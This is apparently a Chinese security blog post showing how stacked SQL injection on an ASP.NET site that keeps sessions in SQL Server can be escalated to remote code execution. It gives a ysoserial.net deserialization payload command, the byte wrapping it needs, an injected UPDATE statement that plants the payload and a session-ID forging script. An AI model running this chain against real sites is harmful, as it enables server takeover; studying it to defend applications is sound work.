<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL to RCE | ALe's Blog</title><meta name="author" content="ALe"><meta name="copyright" content="ALe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="有一些陈旧、庞大的系统中，因为一些复杂的原因，往往仍在使用 sa 账户登入 SQL Server，而在有如此高权限的资料库账户权限下，我们可以轻易利用 xp_cmdshell 来执行系统指令，但是这是几乎不可能的，我们取得的数据库账户必然是低权限，但因为发现的 SQL 注入是堆叠注入，我们仍然可以对表进行 CRUD，运气好可以控制一些网站设定变数的话，甚至可以直接 RCE  就比如我们可以发现某">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL to RCE">
<meta property="og:url" content="https://ale1293528.github.io/2025/08/23/SQL%20to%20RCE/index.html">
<meta property="og:site_name" content="ALe&#39;s Blog">
<meta property="og:description" content="有一些陈旧、庞大的系统中，因为一些复杂的原因，往往仍在使用 sa 账户登入 SQL Server，而在有如此高权限的资料库账户权限下，我们可以轻易利用 xp_cmdshell 来执行系统指令，但是这是几乎不可能的，我们取得的数据库账户必然是低权限，但因为发现的 SQL 注入是堆叠注入，我们仍然可以对表进行 CRUD，运气好可以控制一些网站设定变数的话，甚至可以直接 RCE  就比如我们可以发现某">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ale1293528.github.io/img/mygo4.jpg">
<meta property="article:published_time" content="2025-08-23T14:48:34.000Z">
<meta property="article:modified_time" content="2025-08-23T14:56:18.745Z">
<meta property="article:author" content="ALe">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ale1293528.github.io/img/mygo4.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SQL to RCE",
  "url": "https://ale1293528.github.io/2025/08/23/SQL%20to%20RCE/",
  "image": "https://ale1293528.github.io/img/mygo4.jpg",
  "datePublished": "2025-08-23T14:48:34.000Z",
  "dateModified": "2025-08-23T14:56:18.745Z",
  "author": [
    {
      "@type": "Person",
      "name": "ALe",
      "url": "https://ale1293528.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ale1293528.github.io/2025/08/23/SQL%20to%20RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL to RCE',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/mygo4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ALe's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL to RCE</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL to RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-23T14:48:34.000Z" title="Created 2025-08-23 22:48:34">2025-08-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-23T14:56:18.745Z" title="Updated 2025-08-23 22:56:18">2025-08-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
<p>有一些陈旧、庞大的系统中，因为一些复杂的原因，往往仍在使用 sa 账户登入 SQL Server，而在有如此高权限的资料库账户权限下，我们可以轻易利用 xp_cmdshell 来执行系统指令，但是这是几乎不可能的，我们取得的数据库账户必然是低权限，但因为发现的 SQL 注入是堆叠注入，我们仍然可以对表进行 CRUD，运气好可以控制一些网站设定变数的话，甚至可以直接 RCE</p>
</blockquote>
<p>就比如我们可以发现某些特殊的数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: ASPState</span><br><span class="line">[2 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| dbo.ASPStateTempApplications          |</span><br><span class="line">| dbo.ASPStateTempSessions              |</span><br><span class="line">+---------------------------------------+</span><br></pre></td></tr></table></figure>

<p>这个数据库的存在用途是用来保存 ASP.NET 网站应用程式的 session。 </p>
<p>在 ASP.NET 网站应用程式里，<strong>Session</strong>（会话数据，比如用户登录状态、购物车资料）通常是存放在单一网站应用程式的内存里。也就是说用户访问某个站点时，Session 被保存在那台服务器的内存中，如果用户下次访问还是分配到同一台服务器，那么能顺利找到他的 Seesion</p>
<p>但如果放在做了负载均衡，网站后面有多台 ASP.NET 应用服务器，对外表现是一个站点，用户的请求会分配到不同的服务器，但每台服务器的 Seesion 并不共享，就会导致用户状态丢失</p>
<p>为了解决解决上面的问题，就需要集中存储 Seesion，一种常见做法就是所有服务器共享同一份 Seesion 数据</p>
<p>在 ASP.NET 里，只要在 <code>**web.config**</code> 配置文件中添加相关设定，就可以启用 <strong>SQL Server Session 状态存储</strong>模式。</p>
<p>常见的写法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.web&gt;</span><br><span class="line">        &lt;!-- 將 session 保存在 SQL Server 中。 --&gt;</span><br><span class="line">        &lt;sessionState</span><br><span class="line">            mode=&quot;SQLServer&quot;</span><br><span class="line">            sqlConnectionString=&quot;data source=127.0.0.1;user id=&lt;username&gt;;password=&lt;password&gt;&quot;</span><br><span class="line">            timeout=&quot;20&quot;</span><br><span class="line">        /&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 预设值，将 seesion 保存在内存中 --&gt;</span><br><span class="line">        &lt;!-- &lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&gt; --&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 将 seesion 保存在 ASP.NET State Service 中，另一种跨服务器共享 seesion 的解决方法 --&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        &lt;sessionState</span><br><span class="line">            mode=&quot;StateServer&quot;</span><br><span class="line">            stateConnectionString=&quot;tcpip=localhost:42424&quot;</span><br><span class="line">            timeout=&quot;20&quot;</span><br><span class="line">        /&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">    &lt;/system.web&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>而要在数据库中新建 ASPState 的资料库，可以利用微软自带的小工具 aspnet_regsql 来建立或移除 Session 状态所需的数据库与表，路径在<code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 建立 ASPState 资料库</span><br><span class="line">aspnet_regsql.exe -S 127.0.0.1 -U sa -P password -ssadd -sstype p</span><br><span class="line"></span><br><span class="line"># # 移除 ASPState 数据库</span><br><span class="line">aspnet_regsql.exe -S 127.0.0.1 -U sa -P password -ssremove -sstype p</span><br></pre></td></tr></table></figure>

<p>现在我们了解了这些前置信息后，且又可以控制 ASPState 资料库，便可以做到 RCE</p>
<p>ASP.NET 允许我们在 session 中储存一些物件，例如储存一个 List 物件：<code>Session[&quot;secret&quot;] = new List&lt;String&gt;() &#123; &quot;secret string&quot; &#125;</code>，对于如何将这些物件保存到 SQL Server 上，理所当然使用了序列化机制来处理，而我们又控制了数据库，所有也能执行反序列化，为此我们需要先了解 Session 物件序列化与反序列化的过程</p>
<p>核心操作是通过<code>SqlSessionStateStore.GetItem</code>还原 Session 物件，我们简单了解一下就好，详细的可以看下面的文章</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1186/">https://paper.seebug.org/1186/</a></p>
<h2 id="关键“反序列化链”是怎么打出来的？"><a href="#关键“反序列化链”是怎么打出来的？" class="headerlink" title="关键“反序列化链”是怎么打出来的？"></a>关键“反序列化链”是怎么打出来的？</h2><p><strong>（1）读表→拿二进制→反序列化</strong></p>
<ul>
<li>ASP.NET 取回 Session 时走 <code>SqlSessionStateStore.GetItem()</code> → 内部执行存储过程 <code>ASPState.dbo.TempGetStateItem3</code>。</li>
<li>这个 SP 实际上等价于：从 <code>ASPStateTempSessions</code> 取出 <code>**SessionItemShort**</code>（二进制序列化内容）。</li>
<li>取出来的字节流会传给 <code>SessionStateUtility.DeserializeStoreData(...)</code> 去 <strong>反序列化</strong>。</li>
</ul>
<p><strong>（2）反序列化的分支</strong></p>
<ul>
<li><code>SessionStateUtility.Deserialize(...)</code> 会先按固定格式读头部字段：<ol>
<li><code>timeout</code>（Int32，4字节）</li>
<li><code>hasItems</code>（Boolean，1字节）</li>
<li><code>hasStaticObjects</code>（Boolean，1字节）</li>
</ol>
</li>
<li>然后根据布尔值走两个可能的子反序列化：<ul>
<li><code>SessionStateItemCollection.Deserialize(...)</code>（针对 Session 里“普通键值”）</li>
<li><code>HttpStaticObjectsCollection.Deserialize(...)</code>（针对“静态对象集合”）</li>
</ul>
</li>
<li>这里我们选择第二支（<code>HttpStaticObjectsCollection</code>），因为它内部会调用 <code>**AltSerialization.ReadValueFromStream**</code>，而这条链 <strong>ysoserial.net</strong> 已有“现成 gadget”。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> 已经有建立 AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出这个利器来使用！下面一行指令就可以产生执行系统指令 <code>calc.exe</code> 的 base64 编码后的 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p Altserialization -M HttpStaticObjectsCollection -o base64 -c &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p>但是这个生成的 payload 还需要加以修饰，ysoserial.net 的 <code>AltSerialization plugin</code> 所建立的 payload 是攻击 <code>SessionStateItemCollection</code> 或 <code>HttpStaticObjectsCollection</code> 两个类别的反序列化操作，而我们储存在资料库中的 session 序列化资料是由在此之上还额外作了一层包装的 SessionStateUtility 类别处理的</p>
<p>让我们回头看一下程序码，会发现 SessionStateUtility 也只添加了几个 bytes，减化后如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">timeout = reader.ReadInt32();</span><br><span class="line">hasItems = reader.ReadBoolean();</span><br><span class="line">hasStaticObjects = reader.ReadBoolean();</span><br><span class="line"></span><br><span class="line">if (hasStaticObjects)</span><br><span class="line">    staticObjects = HttpStaticObjectsCollection.Deserialize(reader);</span><br><span class="line"></span><br><span class="line">eof = reader.ReadByte();</span><br></pre></td></tr></table></figure>

<p>对于 Int32 要添加 4 个 bytes，Boolean 则是 1 个 byte，而因为要让程式路径能进入 HttpStaticObjectsCollection 的分支，必须让第 6 个 byte 为 1 才能让条件达成，先将原本从 ysoserial.net 产出的 payload 从 base64 转成 hex 表示，再前后各别添加 6、1 bytes，如下示意图：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  timeout    false  true            HttpStaticObjectsCollection             eof</span><br><span class="line">┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐</span><br><span class="line">00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff</span><br></pre></td></tr></table></figure>

<ul>
<li>头部补：<ul>
<li>4字节 <code>timeout</code>（随便，可 0）</li>
<li>1字节 <code>hasItems</code>（设 <code>0</code>，否则会走另一支）</li>
<li>1字节 <code>hasStaticObjects</code>（**设 **<code>**1**</code>，才能进入 <code>HttpStaticObjectsCollection.Deserialize(...)</code>）</li>
</ul>
</li>
<li>中间放：ysoserial 生成的 <strong>主体 payload</strong>（先从 base64 解出来，再用 hex&#x2F;二进制拼接）。</li>
<li>尾部补：<code>0xFF</code>（ASP.NET 反序列化校验用的 EOF 标志）。</li>
</ul>
<p>修饰完的这个 payload 就能用来攻击 SessionStateUtility 类别了</p>
<p>最后的步骤就是将恶意的序列化内容注入进数据库，如果正常浏览目标网站时有出现 ASP.NET_SessionId 的 Cookie 就代表已经有一笔对应的 Session 记录储存在资料库里，所以我们只需要执行如下的 SQL Update 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1; UPDATE ASPState.dbo.ASPStateTempSessions</span><br><span class="line">       SET SessionItemShort = 0x&#123;Hex_Encoded_Payload&#125;</span><br><span class="line">       WHERE SessionId LIKE &#x27;&#123;ASP.NET_SessionId&#125;%25&#x27;; --</span><br></pre></td></tr></table></figure>

<p>分别将 <code>&#123;ASP.NET_SessionId&#125;</code> 替换成自己的ASP.NET_SessionId 的 Cookie 值以及 <code>&#123;Hex_Encoded_Payload&#125;</code> 替换成前面准备好的序列化 payload 即可</p>
<p>假如没有 ASP.NET_SessionId 怎么办？这表示目标还未储存任何资料在 Session 中，那没有 cookie 我们就硬塞一个 cookie 给他，ASP.NET 的 SessionId 是透过乱数产生的 24 个字元，但使用了客制化的字元集，理论上可以直接使用以下的 Python script 产生一组 SessionId，例如：plxtfpabykouhu3grwv1j1qw，之后带上 Cookie: ASP.NET_SessionId&#x3D;plxtfpabykouhu3grwv1j1qw浏览任一个 aspx 页面，理论上 ASP.NET 就会自动在数据库里添加一笔记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">chars = &#x27;abcdefghijklmnopqrstuvwxyz012345&#x27;</span><br><span class="line">print(&#x27;&#x27;.join(random.choice(chars) for i in range(24)))</span><br></pre></td></tr></table></figure>

<p>等到 Payload 顺利注入后，只要再次用这个 Cookie <code>ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw</code> 浏览任何一个 aspx 页面，就会触发反序列化执行任意系统指令</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io">ALe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io/2025/08/23/SQL%20to%20RCE/">https://ale1293528.github.io/2025/08/23/SQL%20to%20RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post-share"><div class="social-share" data-image="/img/mygo4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/08/24/NSSCTF-4th-wp/" title="NSSCTF 4th-wp"><img class="cover" src="/img/mygo7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">NSSCTF 4th-wp</div></div><div class="info-2"><div class="info-item-1">依旧是单军奋战这一块，而且下午睡到 5 点多才想起来还有这么个比赛，半个小时速通两道 WEB 题这一块 WEBez_signin这题就是典型的 MongoDB NoSQL 注入，突破口在源码里 POST &#x2F;search 接受 JSON 时，title&#x2F;author 如果是 dict 会被原样拼进查询，没有加 $eq 且不做净化，所以可以直接塞 $ne &#x2F; $regex 等操作符来“放大查询”拿到库里全部书、然后做一轮搜索搜出 flagexp： 123456789101112131415161718192021222324252627282930313233343536373839404142import requests, re, jsonbase = &quot;http://node8.anna.nssctf.cn:27612&quot;def dump_all():    # 取全量（有标题的都来）    r = requests.post(base + &quot;/search&quot;,                      hea...</div></div></div></a><a class="pagination-related" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI"><img class="cover" src="/img/mygo1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Python Bottle SSTI</div></div><div class="info-2"><div class="info-item-1">XYCTF 中碰到的 Bottle 框架，当时做题根本没想到通过审计框架代码找漏洞点，也是学到新东西了  Bottle 简介Bottle 是一个 Python 的轻量级 Web 框架，完全依赖标准库（除了 wsgi 的部分），体积非常小（一个 .py 文件就能运行），适合写小型 Web 应用、API 或原型系统。它的设计理念是 “单文件、零依赖”，所以部署非常方便。 主要特点   特点 说明    单文件 框架代码就是一个 bottle.py 文件，方便直接打包或拷贝   零依赖 除了 Python 标准库外不需要额外安装其它库   内置开发服务器 用 run() 就能启动 HTTP 服务   支持多模板引擎 默认内置 SimpleTemplate，也支持 Jinja2、Mako 等   路由简洁 使用装饰器 @route() 定义 URL 对应的处理函数   WSGI兼容 可以在任何 WSGI 服务器（如 gunicorn、uWSGI）上部署   内置常用工具 请求&#x2F;响应处理、静态文件服务、Cookie、表单解析等   基本结构示例1234567from bottle...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/05/2021%20OWASP%20TOP%2010/" title="2021 OWASP TOP 10"><img class="cover" src="/img/anon3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-05</div><div class="info-item-2">2021 OWASP TOP 10</div></div><div class="info-2"><div class="info-item-1">近些年漏洞的威胁分类也发生了很大变化，王道SQL注入也慢慢淡出历史的舞台，最新OWASP Top Ten | OWASP Foundation版，分类和排名都变化了很多  [TOP1]失效的访问控制访问控制失效指的是：系统没有正确限制用户访问资源或功能，导致用户可以访问本不该访问的内容或操作 具体的例子：用户越权访问 用户 A 修改自己的资料：  1POST /api/user/update?id=1001   他把 ID 改成了管理员的 ID：  1POST /api/user/update?id=1   没有权限校验？那就直接修改管理员信息成功了  水平越权普通用户访问了其他用户的数据，比如： 1GET /api/orders/123456  → 返回了别人的订单信息（严重泄露） 垂直越权普通用户调用了管理员接口： 1POST /api/admin/delete_user?id=2  如果没检查角色权限，就能直接删号 前端控制误信前端隐藏了按钮，认为“用户就点不到”： 12&lt;!-- 管理员按钮 --&gt;&lt;button style=&quot;display: ...</div></div></div></a><a class="pagination-related" href="/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/" title="ADS数据流实现隐藏文件"><img class="cover" src="/img/anon1.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-24</div><div class="info-item-2">ADS数据流实现隐藏文件</div></div><div class="info-2"><div class="info-item-1">ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情 在NTFS分区创建ADS数据流文件有两种形式：  一是指定宿主文件； 二是创建单独的ADS文件。  创建的指令有两个：echo 和 type  echo 用于常规字符 type 用于将文件附加到某个文件  使用方法1. 使用宿主文件1echo test &gt; 1.txt:flag.txt 正常用 dir 是无法查看到的，可以使用 dir &#x2F;r 123456789101112131415161718192021222324C:\test&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025...</div></div></div></a><a class="pagination-related" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI"><img class="cover" src="/img/mygo1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-21</div><div class="info-item-2">Python Bottle SSTI</div></div><div class="info-2"><div class="info-item-1">XYCTF 中碰到的 Bottle 框架，当时做题根本没想到通过审计框架代码找漏洞点，也是学到新东西了  Bottle 简介Bottle 是一个 Python 的轻量级 Web 框架，完全依赖标准库（除了 wsgi 的部分），体积非常小（一个 .py 文件就能运行），适合写小型 Web 应用、API 或原型系统。它的设计理念是 “单文件、零依赖”，所以部署非常方便。 主要特点   特点 说明    单文件 框架代码就是一个 bottle.py 文件，方便直接打包或拷贝   零依赖 除了 Python 标准库外不需要额外安装其它库   内置开发服务器 用 run() 就能启动 HTTP 服务   支持多模板引擎 默认内置 SimpleTemplate，也支持 Jinja2、Mako 等   路由简洁 使用装饰器 @route() 定义 URL 对应的处理函数   WSGI兼容 可以在任何 WSGI 服务器（如 gunicorn、uWSGI）上部署   内置常用工具 请求&#x2F;响应处理、静态文件服务、Cookie、表单解析等   基本结构示例1234567from bottle...</div></div></div></a><a class="pagination-related" href="/2025/08/07/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E2%80%94%E2%80%94%E9%A2%84%E7%BC%96%E8%AF%91%E7%9C%9F%E7%9A%84%E8%83%BD%E5%AE%8C%E7%BE%8E%E9%98%B2%E5%BE%A1SQL%E6%B3%A8%E5%85%A5%E5%90%97/" title="SQL预编译——预编译真的能完美防御SQL注入吗"><img class="cover" src="/img/mygo1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">SQL预编译——预编译真的能完美防御SQL注入吗</div></div><div class="info-2"><div class="info-item-1">SQL注入原理sql注入是指攻击者拼接恶意SQL语句到接受外部参数的动态SQL查询中，程序本身未对插入的SQL语句进行过滤，导致SQL语句直接被服务端执行。拼接的SQL查询例如，通过在id变量后插入or 1&#x3D;1这样的条件，来绕过身份验证，获得未授权数据的访问权。 1SELECT * FROM user WHERE id = -1 or 1=1  由于or 1&#x3D;1 满足永真结果，sql语句会执行输出user中的全部内容。 那么这么危险的漏洞，有没有办法进行阻止呢 有的兄弟，有的 预编译就能解决大部分的SQL注入问题 什么是预编译（Prepared Statement）？预编译就是在执行 SQL 前，把 SQL 语句先告诉数据库服务器，编译好结构，然后再单独传参数进去执行！ 它的全名叫： Prepared Statement（预处理语句 &#x2F; 预编译语句） 正常写 SQL 是怎样的？我们先看看普通的拼接 SQL 是怎样的： 123username = input(&quot;请输入用户名：&quot;)sql = &quot;SELECT * FROM u...</div></div></div></a><a class="pagination-related" href="/2025/09/15/base64%E8%A7%A3%E7%A0%81%E5%B0%8Ftrick/" title="base64解码小trick"><img class="cover" src="/img/mygo6.jpg" alt="cover"><div 